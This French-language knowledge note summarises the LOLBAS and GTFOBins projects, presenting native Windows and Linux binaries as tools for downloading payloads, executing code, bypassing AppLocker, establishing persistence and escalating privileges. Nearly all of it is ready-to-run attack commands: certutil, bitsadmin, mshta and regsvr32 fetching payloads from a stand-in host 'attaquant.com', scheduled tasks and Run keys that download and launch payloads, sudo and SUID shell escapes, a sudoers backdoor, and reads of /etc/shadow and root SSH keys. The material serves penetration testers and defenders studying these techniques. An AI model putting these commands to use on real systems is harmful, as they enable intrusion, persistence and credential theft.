---
title: LOLBAS et GTFOBins
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [lolbas, gtfobins, living-off-the-land, windows, linux, evasion, sécurité]
date: 2026-03-22
---

# LOLBAS et GTFOBins

LOLBAS (Living Off The Land Binaries And Scripts) et GTFOBins sont des référentiels de binaires natifs du système d'exploitation qui peuvent être détournés à des fins malveillantes : téléchargement de fichiers, exécution de code, escalade de privilèges, bypass d'AppLocker.

L'avantage : ces binaires sont signés par Microsoft ou font partie de la distribution Linux → évitent les signatures AV et les listes noires.

## LOLBAS — Windows

Référence : https://lolbas-project.github.io

### Téléchargement de fichiers (Download)

```powershell
# certutil — utilitaire de certificats, décode aussi le base64
certutil -urlcache -split -f http://attaquant.com/payload.exe C:\temp\payload.exe
# Encode en base64 et décode
certutil -encode payload.exe payload.b64
certutil -decode payload.b64 payload.exe

# bitsadmin — service de transfert de fichiers en arrière-plan
bitsadmin /transfer job /download /priority high http://attaquant.com/payload.exe C:\temp\payload.exe

# PowerShell
(New-Object Net.WebClient).DownloadFile('http://attaquant.com/payload.exe', 'C:\temp\payload.exe')
Invoke-WebRequest -Uri http://attaquant.com/payload.ps1 -OutFile C:\temp\payload.ps1

# curl (Windows 10+)
curl http://attaquant.com/payload.exe -o C:\temp\payload.exe

# wget (PowerShell alias de Invoke-WebRequest)
wget http://attaquant.com/file.txt -OutFile C:\temp\file.txt

# mshta — télécharge et exécute un HTA
mshta http://attaquant.com/payload.hta

# wscript / cscript
cscript //E:jscript //nologo payload.js

# expand — décompresse des fichiers CAB
expand http://attaquant.com/payload.cab C:\temp\payload.exe
```

### Exécution de code (Execute)

```powershell
# regsvr32 — contourne AppLocker, exécute du code via SCT
regsvr32 /s /n /u /i:http://attaquant.com/payload.sct scrobj.dll

# rundll32 — exécuter une DLL
rundll32 shell32.dll,Control_RunDLL payload.dll
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attaquant.com/payload.sct")

# msiexec — installer un MSI malveillant
msiexec /q /i http://attaquant.com/payload.msi
msiexec /q /i C:\temp\payload.msi

# PresentationHost.exe (XBAP)
PresentationHost.exe -LaunchApplication http://attaquant.com/payload.xbap

# InstallUtil — exécuter du code via .NET
InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# MSBuild — compiler et exécuter du code C# inline
msbuild.exe payload.csproj
# payload.csproj contient du C# dans une tâche inline

# wmic — exécuter des processus
wmic process call create "cmd.exe /c whoami > C:\output.txt"
wmic /node:REMOTE_IP process call create "cmd.exe /c reverse_shell.bat"

# forfiles
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c calc.exe"

# pcalua.exe — Application Compatibility Framework
pcalua -a payload.exe
```

### Bypass AppLocker / WDAC

```powershell
# Répertoires généralement autorisés par AppLocker
C:\Windows\Temp\
C:\Users\<user>\AppData\

# Binaires natifs qui exécutent du code et ne sont pas filtrés
# → regsvr32, rundll32, mshta, InstallUtil, MSBuild, wscript, cscript

# Trusted binaries qui peuvent charger du code arbitraire
# → PowerShell, .NET, WMI

# AppLocker bypass via WDAC — utiliser des outils de Microsoft signés
# → Teams, OneDrive, MSTeams.exe peuvent servir de loader
```

### Persistance avec LOLBAS

```powershell
# Tâches planifiées
schtasks /create /tn "WinUpdate" /tr "certutil -urlcache -f http://attaquant.com/payload.exe C:\temp\p.exe && C:\temp\p.exe" /sc daily

# Registry Run Key
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "mshta http://attaquant.com/persist.hta"

# WMI subscription
# (voir note Persistence)
```

## GTFOBins — Linux / Unix

Référence : https://gtfobins.github.io

### Escalade de privilèges via sudo

```bash
# Si "sudo <binaire>" est autorisé sans mot de passe → vérifier GTFOBins

# sudo vim → shell root
sudo vim -c ':!/bin/bash'

# sudo less → shell root
sudo less /etc/passwd
# Dans less : !bash

# sudo find → exécuter une commande en root
sudo find . -exec /bin/bash \; -quit

# sudo awk → shell root
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo python3 → shell root
sudo python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# sudo perl
sudo perl -e 'exec "/bin/bash";'

# sudo ruby
sudo ruby -e 'exec "/bin/bash"'

# sudo nmap (anciennes versions avec --interactive)
sudo nmap --interactive
nmap> !sh

# sudo tar → exécuter une commande
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# sudo zip → shell
TF=$(mktemp -u); sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/bash"

# sudo git → shell
sudo git -p help config  # Passer en mode "less" puis :!bash

# sudo env
sudo env /bin/bash

# sudo tee → écrire dans un fichier en tant que root
echo "alice ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/alice-backdoor
```

### SUID — exécution avec les droits du propriétaire

```bash
# Trouver les binaires SUID
find / -perm -u=s -type f 2>/dev/null

# Exemples d'exploitation de SUID (GTFOBins)
# bash SUID
/bin/bash -p    # -p = privileged mode, conserve l'EUID root

# find SUID
find . -exec /bin/bash -p \; -quit

# python3 SUID
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# cp SUID → copier un fichier sensible
cp /etc/shadow /tmp/shadow_copy

# cat SUID → lire n'importe quel fichier
cat /root/.ssh/id_rsa

# nano / vim SUID → écrire n'importe où
nano /etc/passwd   # Modifier le mot de passe root
```

### Téléchargement de fichiers

```bash
# curl / wget — standards
curl http://attaquant.com/payload -o /tmp/payload
wget http://attaquant.com/payload -O /tmp/payload

# Python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attaquant.com/payload', '/tmp/payload')"

# Bash via /dev/tcp
bash -c "cat < /dev/tcp/attaquant.com/80" > /tmp/payload

# OpenSSL
openssl s_client -connect attaquant.com:443 | head -c 1000 > /tmp/payload

# tftp (si disponible)
tftp -i attaquant.com GET payload /tmp/payload

# scp (si SSH disponible vers l'attaquant)
scp attaquant@attaquant.com:/payload /tmp/payload
```

### Lecture de fichiers arbitraires (si SUID ou sudo)

```bash
# Via des binaires natifs
# tee
echo "file content" | tee /etc/important_file

# dd
dd if=/etc/shadow of=/tmp/shadow_copy

# awk
awk '{print}' /etc/shadow

# base64 (pour lire des binaires)
base64 /etc/shadow | base64 -d
```

## Workflow pratique

```bash
# 1. Énumération des droits sudo
sudo -l
# → (root) NOPASSWD: /usr/bin/vim → chercher vim sur GTFOBins → shell root

# 2. Énumération des SUID
find / -perm -u=s -type f 2>/dev/null
# → /usr/bin/python3 → chercher python3 SUID sur GTFOBins

# 3. Capabilities Linux (alternative aux SUID)
getcap -r / 2>/dev/null
# → /usr/bin/python3 cap_setuid=ep → escalade garantie
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# 4. Variables d'environnement (PATH, LD_PRELOAD) avec sudo
sudo -l | grep env_keep
# → env_keep += LD_PRELOAD → voir note Linux Privilege Escalation
```
